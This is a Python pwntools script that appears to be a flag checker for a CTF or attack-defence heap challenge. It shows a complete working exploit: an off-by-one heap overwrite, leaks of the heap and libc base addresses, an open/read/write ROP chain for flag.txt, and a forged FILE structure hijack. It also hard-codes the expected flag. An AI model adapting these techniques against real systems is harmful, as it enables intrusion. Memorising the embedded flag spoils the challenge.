#!/usr/bin/env python2
#  -*- coding: utf-8 -*-
from pwn import *
import sys, os, traceback

# 输入为靶机 IP 和端口以及要验证的 flag
HOST = sys.argv[1]
PORT = sys.argv[2]
context(arch="amd64")

GLOBAL_TIMEOUT = 15

DEBUG = 0
if DEBUG:
    context(log_level="debug")
else:
    context(log_level="CRITICAL")

FLAG = "flag{fca864b7-5c0e-fcb6-3303-d50f-f8f52bf62636}"

p = None

#############################################################
def start_connection():
    global p
    try:
        if p: close_connection()
        p = remote(HOST, PORT, timeout=10)
    except:
        if DEBUG:
            traceback.print_exc()
        FAIL("ConnectionFailure")
    
def close_connection():
    global p
    try:
        p.close()
        p = None
    except:
        pass

def timeout_handler(signum, frame):
    FAIL("timeout")

def FAIL(msg):
    if DEBUG:
        print("Fail: %s" %msg)
    print("False")
    exit(-1)

def OK():
    print("True")

####

def add(idx, type, sz):
    p.sendlineafter(b">>", b'0') 
    p.sendlineafter(b":", str(idx).encode())
    p.sendlineafter(b":", str(type).encode())
    p.sendlineafter(b":", str(sz).encode())

def free(idx):
    p.sendlineafter(b">>", b'1') 
    p.sendlineafter(b":", str(idx).encode())

def read(idx, sz):
    p.sendlineafter(b">>", b'2')
    p.sendlineafter(b":", str(idx).encode())
    p.sendlineafter(b":", str(sz).encode())
    p.recvuntil(b"[+] Data: ")
    return p.recv(sz)

def write(idx, ctx):
    p.sendlineafter(b">>", b'3')
    p.sendlineafter(b":", str(idx).encode())
    p.sendlineafter(b":", str(len(ctx)).encode())
    p.sendafter(b":", ctx)

def seek(idx, offset, whence):
    p.sendlineafter(b">>", b'4')
    p.sendlineafter(b":", str(idx).encode())
    p.sendlineafter(b":", str(whence).encode())
    p.sendlineafter(b":", str(offset).encode())

###

def pwn():
    for i in range(7):
        add(i, 0, 0x1e0)
    for i in range(6, -1, -1):
        free(i)
    
    add(0, 0, 0x118)
    add(1, 0, 0xf0)
    add(2, 0, 0xe8)
    
    write(0, 0x118*'\x00'+p8(0xf1))
    free(1)
    
    for i in range(5):
        add(0, 0, 0x10)
    add(1, 0, 0x50)
    
    x = read(2, 0xe8)
    heap = u64(x[8:16]) - 0x1ab3
    libc = u64(x[0xd8:0xe0]) - 0x215b80
    success("libcbase: 0x%lx", libc)
    success("heapbase: 0x%lx", heap)

    heap_os = lambda x : heap + x
    libc_os = lambda x : libc + x
    
    rop_chain = heap_os(0x1b50)
    
    rax_0 = libc_os(0xbab79)
    rax_1 = libc_os(0xd83e0)
    rax_2 = libc_os(0xd83f0)
    xchg = libc_os(0x14a385)
    rdi = libc_os(0x2a3e5)
    rsi = libc_os(0x2be51)
    rdx = libc_os(0x11f497)
    syscall = libc_os(0x91396)
    
    rop_raw = [
        rdi, 0xdeadbeef,
        rsi, 0,
        rax_2, syscall,
        xchg,
        rsi, 0xdeadbeef,
        rdx, 0x100, 0,
        rax_0, syscall,
        rdi, 1,
        rax_1, syscall
    ]
    
    rop_raw[1] = rop_raw[8] = rop_chain + len(rop_raw) * 8
    rop = flat(rop_raw) + 'flag.txt\x00'
    
    add(3, 0, len(rop))
    write(3, rop)
    
    ###
    
    fp = heap_os(0x1a30)
    leave_ret  = libc_os(0x562ec)
    vtable_ptr = libc_os(0x216020)
    forge_file = flat({
      0x10 : 0xffffffffffffffff,
      0x28 : 0xffffffffffffffff,
      0x68 : leave_ret,
      0x88 : heap_os(0x1337),
      0x98 : rop_chain - 8,
      0xa0 : fp,
      0xd8 : vtable_ptr-0x10,
      0xe0 : fp,
    }, filler=b'\x00')
    
    seek(2, 0, 0)
    write(2, forge_file)
    free(1)
    
    x = p.recvuntil("}")
    if FLAG in x:
        return 1

def main():
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(GLOBAL_TIMEOUT)
    
    start_connection()
    if pwn():
        OK()
    else:
        FAIL("can't get flag")
    close_connection()

# 主逻辑
if __name__ == '__main__':
    try:
        main()
    except SystemExit:
        pass
    except:
        if DEBUG:
            traceback.print_exc()
        FAIL("UnknownException")
